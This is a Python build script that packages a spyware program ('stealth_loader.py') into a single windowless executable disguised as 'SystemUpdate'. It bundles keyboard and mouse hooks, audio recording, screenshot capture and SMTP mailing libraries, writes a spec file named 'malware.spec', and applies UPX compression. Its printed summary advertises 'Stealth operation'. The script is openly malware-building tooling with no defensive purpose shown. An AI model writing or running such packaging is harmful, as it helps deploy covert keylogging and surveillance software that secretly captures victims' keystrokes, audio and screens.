#!/usr/bin/env python3
"""
Build script for creating a single executable with PyInstaller.
"""
import os
import sys
import subprocess
import shutil
from pathlib import Path

def install_pyinstaller():
    """Install PyInstaller if not present."""
    try:
        import PyInstaller
        print("PyInstaller already installed")
    except ImportError:
        print("Installing PyInstaller...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"])

def create_spec_file():
    """Create PyInstaller spec file for better control."""
    spec_content = '''# -*- mode: python ; coding: utf-8 -*-

block_cipher = None

a = Analysis(
    ['stealth_loader.py'],
    pathex=[],
    binaries=[],
    datas=[
        ('core', 'core'),
        ('main.py', '.'),
    ],
    hiddenimports=[
        'pynput.keyboard._win32',
        'pynput.mouse._win32',
        'pynput.keyboard._nix',
        'pynput.mouse._nix',
        'pynput.keyboard._darwin',
        'pynput.mouse._darwin',
        'sounddevice',
        'pyscreenshot',
        'cryptography',
        'PIL',
        'email',
        'smtplib',
        'ssl',
        'wave',
        'threading',
        'datetime',
        'pathlib',
    ],
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=[],
    win_no_prefer_redirects=False,
    win_private_assemblies=False,
    cipher=block_cipher,
    noarchive=False,
)

pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.zipfiles,
    a.datas,
    [],
    name='SystemUpdate',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    upx_exclude=[],
    runtime_tmpdir=None,
    console=False,
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
    icon=None,
)
'''
    
    with open('malware.spec', 'w') as f:
        f.write(spec_content)
    
    print("Created malware.spec file")

def build_executable():
    """Build the executable using PyInstaller."""
    print("Building executable...")
    
    # Use the spec file for better control
    subprocess.check_call([
        sys.executable, "-m", "PyInstaller",
        "--clean",
        "malware.spec"
    ])
    
    print("Build completed!")

def optimize_executable():
    """Optimize the executable size and add stealth features."""
    exe_path = Path("dist/SystemUpdate")
    
    if sys.platform == "win32":
        exe_path = exe_path.with_suffix('.exe')
    
    if exe_path.exists():
        print(f"Executable created: {exe_path}")
        print(f"Size: {exe_path.stat().st_size / (1024*1024):.1f} MB")
        
        # Optional: Use UPX for further compression
        try:
            subprocess.run(['upx', '--best', str(exe_path)], check=True)
            print("UPX compression applied")
        except (subprocess.CalledProcessError, FileNotFoundError):
            print("UPX not available, skipping compression")
    else:
        print("Error: Executable not found!")

def main():
    """Main build process."""
    print("=" * 50)
    print("Building Stealth Executable")
    print("=" * 50)
    
    # Install PyInstaller
    install_pyinstaller()
    
    # Create spec file
    create_spec_file()
    
    # Build executable
    build_executable()
    
    # Optimize
    optimize_executable()
    
    print("\n" + "=" * 50)
    print("Build Complete!")
    print("=" * 50)
    print("Executable location: dist/SystemUpdate")
    print("Features:")
    print("- Single file executable")
    print("- No console window")
    print("- Auto-installs dependencies")
    print("- Stealth operation")
    print("=" * 50)

if __name__ == "__main__":
    main() 